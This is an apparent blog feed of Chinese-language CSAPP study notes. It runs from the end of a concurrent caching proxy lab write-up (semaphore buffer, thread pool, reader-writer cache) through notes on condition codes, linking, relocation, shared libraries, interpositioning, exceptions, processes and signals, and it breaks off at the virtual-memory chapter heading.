B</h2><p>并发做的是预线程化的方式.照书上实现了sbuf包实现对client_fd(connfd)的管理.将之前程序中的StartWork作为线程例程.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306251624471.png"></p><h3 id="sbuf包"><a href="#sbuf包" class="headerlink" title="sbuf包"></a>sbuf包</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SBUF_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBUF_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> {</span><br><span class="line">    <span class="type">int</span>* buf;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="type">int</span> front;  <span class="comment">//buf[(front+1)%count]为第一个item</span></span><br><span class="line">    <span class="type">int</span> rear;   <span class="comment">//buf[rear%count]为最后一个元素</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;</span><br><span class="line">    <span class="type">sem_t</span> slots;</span><br><span class="line">    <span class="type">sem_t</span> items;</span><br><span class="line">}<span class="type">sbuf_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="type">sbuf_t</span>* sp,<span class="type">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="type">sbuf_t</span>* sp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="type">sbuf_t</span>* sp,<span class="type">int</span> item)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="type">sbuf_t</span>* sp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    sp-&gt;buf = <span class="built_in">calloc</span>(n,<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    sp-&gt;count = n;</span><br><span class="line">    sp-&gt;front = sp-&gt;rear = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sem_init</span>(&amp;sp-&gt;mutex,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sem_init</span>(&amp;sp-&gt;slots,<span class="number">0</span>,n);</span><br><span class="line">    <span class="built_in">sem_init</span>(&amp;sp-&gt;items,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">free</span>(sp-&gt;buf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;slots);</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    sp-&gt;buf[(++sp-&gt;rear)%(sp-&gt;count)] = item;</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;items);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;items);</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    item = sp-&gt;buf[(++sp-&gt;front)%(sp-&gt;count)];</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;slots);</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> listenfd,connfd;</span><br><span class="line">    <span class="type">char</span> client_hostname[MAXLINE];</span><br><span class="line">    <span class="type">char</span> client_port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_storage</span> clientaddr;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr,PREFIX_PRINT<span class="string">"usage: %s &lt;port&gt;\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sbuf_init</span>(&amp;sbuf,SBUFSIZE);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NTHREADS;++i)</span><br><span class="line">        <span class="built_in">pthread_create</span>(&amp;tid,<span class="literal">NULL</span>,StartWork,<span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    listenfd = <span class="built_in">open_listenfd</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="built_in">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = <span class="built_in">accept</span>(listenfd,(SA*)&amp;clientaddr,&amp;clientlen);        </span><br><span class="line">        <span class="built_in">Getnameinfo</span>((SA*)&amp;clientaddr,clientlen,client_hostname,MAXLINE,client_port,MAX_PORTLEN,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Acceptd connection from (%s,%s),clientFd: %d\n"</span>,client_hostname,client_port,connfd);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sbuf_insert</span>(&amp;sbuf,connfd);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Part-C-1"><a href="#Part-C-1" class="headerlink" title="Part C"></a>Part C</h2><p>类似于Cache lab的设计,读写cache使用的是读者优先的读者-写者模型.要注意的一点是读者读完后其实也会进行写(更新lru),所以也要上锁.<br>想清楚读者-写者模型的特征,每一个地方上锁是为了避免怎样的竞争,之后便可以根据需求做出变化.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> uri[MAXLINE];</span><br><span class="line">    <span class="type">char</span> content_type[MAXLINE];</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">    <span class="type">char</span> server[MAXLINE];</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> lru;</span><br><span class="line">}CacheLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">{</span><br><span class="line">    CacheLine* cachelines;</span><br><span class="line">    <span class="type">size_t</span> current_lru;</span><br><span class="line">    <span class="type">size_t</span> cache_num;</span><br><span class="line">    <span class="type">size_t</span> cache_size;</span><br><span class="line">}Cache;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306271005363.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP--Notes</title>
      <link href="/2023/CSAPP--Notes/"/>
      <url>/2023/CSAPP--Notes/</url>
      
        <content type="html"><![CDATA[<p>CSAPP阅读笔记<br>文章仅作为笔者复习参考,其中内容仅为笔者当前阶段学习CSAPP的理解.</p><h1 id="第三章-程序的机器级表示"><a href="#第三章-程序的机器级表示" class="headerlink" title="第三章 程序的机器级表示"></a>第三章 程序的机器级表示</h1><h3 id="3-6-1条件码"><a href="#3-6-1条件码" class="headerlink" title="3.6.1条件码:"></a>3.6.1条件码:</h3><p>CF:进位标志.最近的操作使最高位产生了进位.<br>ZF:零标志.最近操作的结果为0.<br>SF:符号标志.最近的操作得到负数.<br>OF:溢出标志.最近的操作导致一个补码溢出<br>PF:奇偶标志位.最近操作的结果所有bit中1为偶数<br>AF:辅助进位标志位 运算过程中看最后四位,不论长度为多少 最后四位向前有进位或者借位,AF=1,否则AF=0<br>TF:调试标志位 当TF=1时,处理器每次只执行一条指令,即单步执行<br>IF:中断允许标志位 它用来控制8086是否允许接收外部中断请求 若IF=1,8086能响应外部中断,反之则屏蔽外部中断<br>DF:方向标志位 在串处理指令中,每次操作后,如果DF=0,si di递增,如果DF=1,si di递减;注意此处DF的值是由程序员进行设定的 cld命令是将DF设置为0,std命令是将DF设置为1<br>进位标志表示无符号数运算结果是否超出范围，运算结果仍然正确；<br>溢出标志表示有符号数运算结果是否超出范围，运算结果已经不正确。<br>leaq指令不改变任何条件码.对于逻辑操作,进位标志和溢出标志会设置成0.对于移作,进位标志将设置为最后一个被移出的位,溢出标志设置为0.INC和DEC指令仅设出和零标志.</p><span id="more"></span><h1 id="第七章-链接"><a href="#第七章-链接" class="headerlink" title="第七章 链接"></a>第七章 链接</h1><h2 id="7-3目标文件"><a href="#7-3目标文件" class="headerlink" title="7.3目标文件"></a>7.3目标文件</h2><ol><li>可重定位目标文件:由编译器和汇编器产生,包含从地址0开始的代码和数据节</li><li>可执行目标文件:可直接复制到内存并执行</li><li>共享目标文件:特殊类型的可重定位目标文件,可以在加载或者运行时被动态地加载进内存并链接.</li></ol><h2 id="7-5-符号和符号表"><a href="#7-5-符号和符号表" class="headerlink" title="7.5 符号和符号表"></a>7.5 符号和符号表</h2><p>static属性的C函数和全局变量为局部符号,仅为定义该符号的模块(源文件)所私有,其他模块无法通过extern声明使用.用static来保护变量和函数是良好的编程习惯.</p><h3 id="符号表条目"><a href="#符号表条目" class="headerlink" title="符号表条目"></a>符号表条目</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>{</span></span><br><span class="line"><span class="type">int</span> name;</span><br><span class="line"><span class="type">char</span> type:<span class="number">4</span>,</span><br><span class="line">binding:<span class="number">4</span>;</span><br><span class="line"><span class="type">char</span> reserved;</span><br><span class="line"><span class="type">short</span> section;</span><br><span class="line"><span class="type">long</span> value;</span><br><span class="line"><span class="type">long</span> size;</span><br><span class="line">}Elf64_Symbol;</span><br></pre></td></tr></tbody></table></figure><p>name是字符串表(.strtab)中对应符号的字节偏移,type是数据或函数.binding指示符号是本地还是全局.value是距定义目标的节的起始位置的偏移(相对地址,<code>对于可执行目标文件来说,该值是一个绝对运行时地址</code>.<del>不是很理解呢?</del>)<br>每个符号被分配到目标文件的某个节,由section表示.<br>有三个特殊的伪节(仅存在于可重定位目标文件中):<br>    1.ABS 不该被重定位的符号<br>    2.UNDEF 未定义的符号<br>    3.COMMON 未初始化的全局变量<br>区别于COMMON节,bss分配未初始化的静态变量,以及初始化为0的全局或静态变量.</p><h2 id="7-6符号解析"><a href="#7-6符号解析" class="headerlink" title="7.6符号解析"></a>7.6符号解析</h2><p>将每个引用于它输入的可重定位目标文件的符号表中的一个确定符号定义关联</p><h3 id="7-6-1-多重定义的全局符号"><a href="#7-6-1-多重定义的全局符号" class="headerlink" title="7.6.1 多重定义的全局符号"></a>7.6.1 多重定义的全局符号</h3><p>函数和已初始化的全局变量是强符号,未初始化的全局变量是弱符号.<br>规则1:不允许多个同名的强符号<br>规则2:如果一个强符号和多个弱符号同名,选强符号<br>规则3:如果多个弱符号同名,则任意选择一个</p><p>该规则下会造成一些不易察觉的运行时错误.使用GCC-fno_common标志指示链接器不允许多重定义全局符号.</p><h3 id="7-6-2-与静态库链接"><a href="#7-6-2-与静态库链接" class="headerlink" title="7.6.2 与静态库链接"></a>7.6.2 与静态库链接</h3><h4 id="为什么要支持库的概念"><a href="#为什么要支持库的概念" class="headerlink" title="为什么要支持库的概念"></a>为什么要支持库的概念</h4><p>方案一:让编译器辨认出对标准函数的调用,并生成相应代码.<br>缺点:编译器过于复杂,每次增删改一个标准函数,就需要一个新版本编译器<br>方案二:将所有标准函数放在一个可重定位目标文件libc.o中<br>缺点:内存占用大,更新编译时间长<br>方案三:相关函数编译为独立的目标模块(静态库),链接时只复制被程序引用的目标模块.</p><h4 id="静态库实现"><a href="#静态库实现" class="headerlink" title="静态库实现"></a>静态库实现</h4><p>Linux以存档(archive)的特殊文件格式存储静态库.存档文件时一组连接起来的可重定位目标文件的集合,有一个头部用来描述每个成员目标文件的大小和位置(.a)</p><h3 id="7-6-3-链接器解析引用"><a href="#7-6-3-链接器解析引用" class="headerlink" title="7.6.3 链接器解析引用"></a>7.6.3 链接器解析引用</h3><p>在符号解析阶段,链接器从左到右按照静态库在命令行中出现的顺序扫描可重定位目标文件和存档文件(自动将.c翻译为.o).在这次扫描中,链接器维护一个可重定位文件的集合E(这个集合中的文件会被合并起来形成可执行文件),一个未解析的符号(引用了但未定义)集合U,一个在前面输入文件中已定义的符号集合D.初始时EUD均为空。<br>对于命令行中每一个输入文件f,若为目标文件,则把f添加到E,修改U和D反应f中的符号定义和引用.若为存档文件,遍历目录尝试寻找可重定位目标文件m匹配U中的未定义符号,将m添加到E中,修改U和D反应f中的符号定义和引用,直到U和D不再发生变化.此时不在E中的目标文件都被简单的丢弃.<br>若完成所有f的扫描后,U是非空的,则报错.否则就合并和重定位E中的目标文件,构建输出的可执行文件.<br>这样的算法决定了链接时文件需要排序.</p><h2 id="7-7-重定位"><a href="#7-7-重定位" class="headerlink" title="7.7 重定位"></a>7.7 重定位</h2><p>重定位将合并输入模块,为每个符号分配运行时地址.<br>重定位由两步组成:<br>    1.重定位节和符号定义.链接器将所有相同类型的节合并为同一类型的聚合节.然后将运行时的内存地址赋给新的聚合节,赋给输入模块定义的每个节,赋给输入模块定义的每个符号<br>    2.重定位节中的符号引用.依赖重定位条目,修改对每个符号的引用,使得它们指向正确的运行时地址.</p><h3 id="7-7-1-重定位条目"><a href="#7-7-1-重定位条目" class="headerlink" title="7.7.1 重定位条目"></a>7.7.1 重定位条目</h3><p>汇编器对最终位置未知的目标引用,生成一个重定位条目,指示链接器在合并时如何修改这个引用.代码的重定位条目放在.rel.text中,已初始化数据的重定位条目放在.rel.data中.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>{</span></span><br><span class="line"><span class="type">long</span> offset; <span class="comment">//符号引用距该节的字节偏移(节偏移)</span></span><br><span class="line"><span class="type">long</span> type:<span class="number">32</span>,<span class="comment">//指示如何修改引用</span></span><br><span class="line">symbol:<span class="number">32</span>;<span class="comment">//符号表中的index</span></span><br><span class="line"><span class="type">long</span> addend;<span class="comment">//有符号常数,指示对地址做偏移调整</span></span><br><span class="line">}Elf64_Rela</span><br></pre></td></tr></tbody></table></figure><p>链接器在每个节以及每个与该节相关联的重定位条目上迭代执行,根据不同重定位类型对修改引用为运行时地址相关数据.(绝对寻址、PC相对寻址…)</p><h2 id="7-10-动态链接库"><a href="#7-10-动态链接库" class="headerlink" title="7.10 动态链接库"></a>7.10 动态链接库</h2><h3 id="静态库的缺点"><a href="#静态库的缺点" class="headerlink" title="静态库的缺点"></a>静态库的缺点</h3><p>若静态库更新,必须显示的将程序与新的静态库重新链接.<br>且对一些大量使用的函数,这些函数的代码将会被复制到每个运行进程的文本段中,浪费内存.</p><h3 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h3><p>共享库(共享目标)是一个目标模块,在运行和加载时加载到相应内存地址,并和一个在内存中的程序链接起来.这一动态链接的过程由一个叫动态链接器的程序执行.在Linux中使用.so后缀,在微软操作系统中被称为DLL.<br>一个共享库的.text节的一个副本可以被不同的正在运行时的进程共享.</p><h2 id="7-11-从应用程序中加载和链接共享库"><a href="#7-11-从应用程序中加载和链接共享库" class="headerlink" title="7.11 从应用程序中加载和链接共享库"></a>7.11 从应用程序中加载和链接共享库</h2><p>dlopen,dlsym,dlerror.</p><h2 id="7-12-位置无关代码-fpic"><a href="#7-12-位置无关代码-fpic" class="headerlink" title="7.12 位置无关代码 -fpic"></a>7.12 位置无关代码 -fpic</h2><p>将共享库加载到内存的任意位置</p><h3 id="PIC数据引用"><a href="#PIC数据引用" class="headerlink" title="PIC数据引用"></a>PIC数据引用</h3><p>无论在任意地址加载一个目标模块,数据段与代码段距离保持不变.<br>编译器在数据段开始的地方创建GOT表,加载时动态链接器会重定位GOT表中的每个条目,使得它包含目标的绝对地址.<br>程序运行时,指令通过固定偏移访问对应GOT表并取出绝对地址,完成数据引用的解析.</p><h3 id="PIC函数调用"><a href="#PIC函数调用" class="headerlink" title="PIC函数调用"></a>PIC函数调用</h3><p>详见ret2dl_resolve.</p><h2 id="7-13-库打桩机制"><a href="#7-13-库打桩机制" class="headerlink" title="7.13 库打桩机制"></a>7.13 库打桩机制</h2><p>基本思想:给定一个需要打桩的目标函数,创建一个包装函数,它的院线和目标函数完全一样,使用某种特殊的打桩机制,欺骗系统调用目标函数,再将目标函数的返回值传递给调用者.</p><h3 id="7-13-1-编译时打桩"><a href="#7-13-1-编译时打桩" class="headerlink" title="7.13.1 编译时打桩"></a>7.13.1 编译时打桩</h3><p>更改可重定位目标文件路径.</p><h3 id="7-13-2-链接时打桩"><a href="#7-13-2-链接时打桩" class="headerlink" title="7.13.2 链接时打桩"></a>7.13.2 链接时打桩</h3><p>Linux静态链接器支持使用–wrap f标志打桩,将对f的引用解析成__wrap_f,把对__real_f的引用解析为f<br>gcc -Wl,–wrap,malloc</p><h3 id="7-13-3-运行时打桩"><a href="#7-13-3-运行时打桩" class="headerlink" title="7.13.3 运行时打桩"></a>7.13.3 运行时打桩</h3><p>修改动态链接器的LD_PRELOAD环境变量</p><h1 id="第八章-异常控制流"><a href="#第八章-异常控制流" class="headerlink" title="第八章 异常控制流"></a>第八章 异常控制流</h1><h2 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h2><p>处理器状态变化称为事件.<br>在任何情况下,当处理器检测到事件发生,它通过一张由异常表基址寄存器寻址的跳转表(即异常表),进行一个间接过程调用,到一个专门设计用来处理这类实践的操作系统子程序_——异常处理程序.</p><h3 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h3><p>系统中每种可能类型的异常都分配有一个非负整数的异常号,部分由处理器定义(被零除、缺页、内存访问违例、断点以及算术运算溢出),其他由操作系统内核定义(系统调用,外部IO信号)</p><p>当系统启动(计算机重启或加电)时,操作系统分配和初始化一张名为异常表的跳转表,当异常发生,处理器通过异常表基址n和异常号k,调用n+4*k地址存放的异常处理函数指针.</p><p>异常处理程序运行在内核模式下,对所有的系统资源有完全的访问权限.<br>当控制从用户程序转移到内核,所有的状态信息将压入内核栈中.</p><p>ps:linux系统调用使用的跳转表并非异常表,但也需要通过0x80号异常先进入异常处理程序再进一步跳转.</p><h3 id="8-1-2-异常的类别"><a href="#8-1-2-异常的类别" class="headerlink" title="8.1.2 异常的类别"></a>8.1.2 异常的类别</h3><ol><li>中断:处理器外部IO设备信号</li><li>陷阱和系统调用:执行一条指令产生的有意旳异常,在用户程序和内核之间提供一个接口,即系统调用.</li><li>故障:由错误情况引起,可能被故障处理程序修正,若成功修正就重新执行引起故障的指令,否则返回到abort例程终止程序.(如缺页,以及linux中的段错误,但linux并不会尝试恢复这个错误.)</li><li>终止:不可恢复的致命错误,返回到abort例程终止应用程序.</li></ol><h2 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h2><p>进程是一个执行中程序的实例.系统中每个程序都运行在某个进程的上下文中.</p><h3 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h3><p>处理器用某个控制寄存器的一个模式位来标识运行模式.<br>linux提供/proc文件系统,允许用户模式进程访问内核数据结构内容.</p><h4 id="proc文件系统-待补充"><a href="#proc文件系统-待补充" class="headerlink" title="/proc文件系统 待补充"></a>/proc文件系统 待补充</h4><h3 id="8-2-5-上下文切换"><a href="#8-2-5-上下文切换" class="headerlink" title="8.2.5 上下文切换"></a>8.2.5 上下文切换</h3><p>内核为每个进程维持一个上下文.上下文是内核重新启动一个被抢占的进程所需的状态.也是程序正确运行所必须的状态.<br>在进程的某些时刻,内核可以决定抢占当前进程,并重新开始一个先前被抢占的进程.这种决策叫做调度,由内核中称为调度器的代码处理.</p><h2 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h2><p>当系统级函数遇到错误时,通常会设置全局整型变量errno,可以通过错误报告函数(输出错误信息,处理错误或退出程序)以及错误处理包装函数(将可能发生错误的函数和错误处理函数封装到一起)来处理错误同时防止代码臃肿.</p><h2 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h2><h3 id="8-4-3-回收子进程"><a href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305050013956.png"></p><h3 id="8-4-5加载并运行程序"><a href="#8-4-5加载并运行程序" class="headerlink" title="8.4.5加载并运行程序"></a>8.4.5加载并运行程序</h3><p>execve函数在当前进程的上下文中加载并运行一个新程序</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt; unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename,<span class="type">const</span> <span class="type">char</span>* argv[],<span class="type">const</span> <span class="type">char</span>* envp[])</span>;</span><br></pre></td></tr></tbody></table></figure><p>execve函数调用一次且只在发生错误(如找不到filename对应文件)才返回到调用程序.<br>argv变量指向一个以null结尾的指针数组,每个指针指向一个参数字符串,argv[0]为可执行目标文件的名字.envp指向一个以null结尾的指针数组,每个指针指向一个环境变量字符串,每个串都是形如”name=value”的名字-值对.<br>在execve加载了filename后,调用启动代码,将控制传递给新程序的主函数.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305050022890.png"></p><h3 id="程序与进程"><a href="#程序与进程" class="headerlink" title="程序与进程"></a>程序与进程</h3><p>程序是一堆代码和数据,可以作为目标文件存在于磁盘上,或者作为段存在于地址空间中.进程时执行中程序的一个实例.</p><h3 id="利用fork和execve运行程序"><a href="#利用fork和execve运行程序" class="headerlink" title="利用fork和execve运行程序"></a>利用fork和execve运行程序</h3><h2 id="8-5-信号-重点且内容多-翻书查阅"><a href="#8-5-信号-重点且内容多-翻书查阅" class="headerlink" title="8.5 信号 (重点且内容多,翻书查阅)"></a>8.5 信号 (重点且内容多,翻书查阅)</h2><p>信号是更高层的软件形式的异常,低层的硬件异常是由内核异常处理程序处理的,正常情况下对用户进程不可见.信号提供一种机制,通知用户进程发生了这些异常.</p><h3 id="8-5-1-信号术语"><a href="#8-5-1-信号术语" class="headerlink" title="8.5.1 信号术语"></a>8.5.1 信号术语</h3><p>接收信号:当目的进程被内核强迫以某种方式对信号作出反应时,它就接收了信号.一个发出而没有被接收的信号叫待处理信号.在任何时刻,一种类型至多只会有一个待处理信号.如果一个进程由有一个类型为k的待处理信号,那么任何接下来发送到这个进程的类型k的信号都不会排队等待,而是被直接丢弃.(如果当前进程正在执行k的信号处理程序,此时再次收到信号k,该信号会排队等待而不是丢弃)<br>实时信号将不会被丢弃,而是多次注册.</p><p>捕获信号:调用信号处理程序<br>处理信号:执行信号处理程序</p><p>进程只有处理完信号才会返回用户态，进程在用户态下不会有未处理完的信号.<br>如果进程收到一个要捕捉的信号，那么进程从内核态返回用户态时执行用户定义的函数。而且执行用户定义的函数的方法很巧妙，内核是在用户栈上创建一个新的层，该层中将返回地址的值设置成用户定义的处理函数的地址，这样进程从内核返回弹出栈顶时就返回到用户定义的函数处，从函数返回再弹出栈顶时，才返回原先进入内核的地方。这样做的原因是用户定义的处理函数不能且不允许在内核态下执行(如果用户定义的函数在内核态下运行的话，用户就可以获得任何权限)</p><h2 id="8-6-非本地跳转"><a href="#8-6-非本地跳转" class="headerlink" title="8.6 非本地跳转"></a>8.6 非本地跳转</h2><p>setjmp(jmp_buf env),sigsetjmp(sigjmp_buf env,int savesigs)在参数env中保存当前调用环境.调用时返回0.且任何情形下返回值不能赋给变量.<br>(sigsetjmp保存的环境还包括信号的上下文:待处理的和被阻塞的信号向量)</p><p>longjmp(jmp_buf env,int retval)函数从env中恢复最近一次初始化该env的setjmp调用保存的环境,然后从setjmp返回,并带有非零的返回值retval.</p><p>也就是说,setjmp调用一次返回多次,longjmp调用一次,但从不返回.</p><p>非本地跳转的一个重要应用就是允许从一个深层嵌套的函数调用中立即返回.(比如检测到错误后立即跳转到错误处理程序而不是费力地解开调用栈.)</p><p>C++和Java地异常机制是较高层次的.catch类似于setjmp,throw类似于longjmp.</p><h1 id="第九章-虚拟内存"><a href="#第九章-虚拟内存" class="headerlink" title="第九章 虚拟内存"></a>第九章 虚拟内存</h1><h2 id="9-1-物理和虚拟寻址"><a href="#9-1-物理和虚拟寻址" 